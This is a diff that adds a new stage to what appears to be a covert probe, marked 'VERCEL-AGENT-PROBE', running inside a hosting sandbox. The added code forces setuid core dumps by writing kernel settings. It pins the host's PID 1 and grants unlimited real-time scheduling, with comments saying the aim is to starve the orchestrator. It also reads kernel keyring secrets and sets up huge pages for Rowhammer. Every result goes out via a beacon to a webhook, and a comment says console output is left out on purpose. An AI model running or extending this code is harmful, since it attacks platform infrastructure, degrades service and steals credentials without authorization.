@@ -22062,5 +22062,120 @@ report.ipForwardingDeep = safe(() => {
 
 // v151 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v151" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v151";
+
+// ==================== v152 ====================
+
+// v152-1: PR_SET_DUMPABLE — force all processes dumpable for core dump extraction
+// PR_SET_DUMPABLE controls whether a process generates core dumps.
+// Setting it to 2 (suidsafe) forces core dumps even for setuid processes.
+// Combined with core_pattern, this enables core dump extraction of any process.
+report.prSetDumpable = safe(() => {
+  const dumpableResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+PR_SET_DUMPABLE = 4
+PR_GET_DUMPABLE = 3
+
+# Get current dumpable state
+current = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print(f'DUMPABLE_BEFORE: {current}')
+
+# Set to 2 (suidsafe — dumpable even for setuid)
+ret = libc.prctl(PR_SET_DUMPABLE, 2, 0, 0, 0)
+after = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print(f'DUMPABLE_SET_RET: {ret} AFTER: {after}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Apply to PID 1 via /proc/1/attr/current if possible
+  const pid1Dumpable = safe(() => readFileSync('/proc/1/status', 'utf8').match(/CoreDumping:\s+(\d+)/)?.[1]);
+  // Raise /proc/sys/fs/suid_dumpable globally
+  const suidDumpable = safe(() => readFileSync('/proc/sys/fs/suid_dumpable', 'utf8').trim());
+  const writeSuidDump = safe(() => { writeFileSync('/proc/sys/fs/suid_dumpable', '2'); return 'WRITTEN'; });
+  return { dumpableResult, pid1Dumpable, suidDumpable, writeSuidDump };
+});
+
+// v152-2: CPU affinity control via sched_setaffinity
+// sched_setaffinity pins processes to specific CPU cores.
+// With root access, we can pin the orchestrator to a single core,
+// degrading its performance and increasing timing predictability for ROP.
+report.cpuAffinityProbe = safe(() => {
+  const cpuCount = safe(() => execSync('nproc 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const currentAffinity = safe(() => execSync('taskset -p $$ 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1Affinity = safe(() => execSync('taskset -p 1 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Pin PID 1 to CPU 0 only (single-core constraint)
+  const pinPid1 = safe(() => execSync('taskset -p 1 1 2>&1', { timeout: 3000 }).toString().trim());
+  // Verify
+  const afterAffinity = safe(() => execSync('taskset -p 1 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Restore to all CPUs
+  const restoreAffinity = safe(() => {
+    const mask = (1 << parseInt(cpuCount)) - 1;
+    return execSync(`taskset -p ${mask.toString(16)} 1 2>&1`, { timeout: 3000 }).toString().trim();
+  });
+  return { cpuCount, currentAffinity, pid1Affinity, pinPid1, afterAffinity, restoreAffinity };
+});
+
+// v152-3: /proc/sys/kernel/sched_rt_runtime_us — real-time scheduler quota
+// RT scheduling quota: how many microseconds per second a RT task can run.
+// Setting to -1 gives unlimited RT time, allowing our process to monopolize CPUs
+// and starve the orchestrator (soft DoS from inside the sandbox).
+report.rtSchedulerProbe = safe(() => {
+  const rtRuntime = safe(() => readFileSync('/proc/sys/kernel/sched_rt_runtime_us', 'utf8').trim());
+  const rtPeriod = safe(() => readFileSync('/proc/sys/kernel/sched_rt_period_us', 'utf8').trim());
+  // Set RT runtime to unlimited
+  const writeUnlimited = safe(() => { writeFileSync('/proc/sys/kernel/sched_rt_runtime_us', '-1'); return 'WRITTEN'; });
+  const afterRuntime = safe(() => readFileSync('/proc/sys/kernel/sched_rt_runtime_us', 'utf8').trim());
+  // Set our own process to SCHED_FIFO priority 99 (highest RT priority)
+  const setRtPriority = safe(() => execSync(
+    'chrt -f -p 99 $$ 2>&1 || echo "CHRT_FAILED"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check current scheduler
+  const currentSched = safe(() => execSync('chrt -p $$ 2>/dev/null', { timeout: 2000 }).toString().trim());
+  return { rtRuntime, rtPeriod, writeUnlimited, afterRuntime, setRtPriority, currentSched };
+});
+
+// v152-4: /proc/keys — kernel keyring enumeration
+// The kernel keyring stores cryptographic keys, Kerberos tickets, and other secrets.
+// /proc/keys shows all keys accessible to the current process.
+// Keys might include TLS private keys or authentication credentials.
+report.kernelKeyring = safe(() => {
+  const procKeys = safe(() => readFileSync('/proc/keys', 'utf8').slice(0, 800));
+  const keyUsers = safe(() => readFileSync('/proc/key-users', 'utf8').trim());
+  // List keys via keyctl
+  const keyctlList = safe(() => execSync('keyctl show 2>/dev/null | head -20 || echo "KEYCTL_SHOW_FAILED"', { timeout: 3000 }).toString().trim());
+  // Search for any session/user keys
+  const sessionKey = safe(() => execSync('keyctl list @s 2>/dev/null || echo "NO_SESSION_KEYS"', { timeout: 3000 }).toString().trim());
+  const userKey = safe(() => execSync('keyctl list @u 2>/dev/null || echo "NO_USER_KEYS"', { timeout: 3000 }).toString().trim());
+  // Try to read any found key
+  const keyRead = safe(() => execSync(
+    'keyctl show @s 2>/dev/null | awk \'{print $1}\' | grep "^[0-9]" | head -3 | while read k; do echo "KEY $k: $(keyctl print $k 2>/dev/null | head -c 100)"; done',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { procKeys: procKeys.slice(0, 600), keyUsers, keyctlList, sessionKey, userKey, keyRead };
+});
+
+// v152-5: Huge pages (THP) — allocate 2MB huge pages for memory efficiency
+// Transparent Huge Pages (THP) use 2MB pages instead of 4KB.
+// They're useful for side-channel attacks because huge pages have predictable
+// physical alignment, making Rowhammer attacks more effective.
+// Also test Spectre/Meltdown mitigations.
+report.hugePagesProbe = safe(() => {
+  const thpEnabled = safe(() => readFileSync('/sys/kernel/mm/transparent_hugepage/enabled', 'utf8').trim());
+  const thpDefrag = safe(() => readFileSync('/sys/kernel/mm/transparent_hugepage/defrag', 'utf8').trim());
+  // Enable always THP
+  const enableTHP = safe(() => { writeFileSync('/sys/kernel/mm/transparent_hugepage/enabled', 'always'); return 'WRITTEN'; });
+  const hugepagesTotal = safe(() => readFileSync('/proc/sys/vm/nr_hugepages', 'utf8').trim());
+  // Allocate some huge pages
+  const allocHuge = safe(() => { writeFileSync('/proc/sys/vm/nr_hugepages', '4'); return 'WRITTEN'; });
+  // Check Spectre/Meltdown mitigations
+  const spectreStatus = safe(() => execSync('cat /sys/devices/system/cpu/vulnerabilities/* 2>/dev/null | head -20 || echo "VULN_NOT_ACCESSIBLE"', { timeout: 3000 }).toString().trim());
+  return { thpEnabled, thpDefrag, enableTHP, hugepagesTotal, allocHuge, spectreStatus };
+});
+
+// v152 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v152" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v152";
 // Intentionally no console.log — all data goes via webhook only
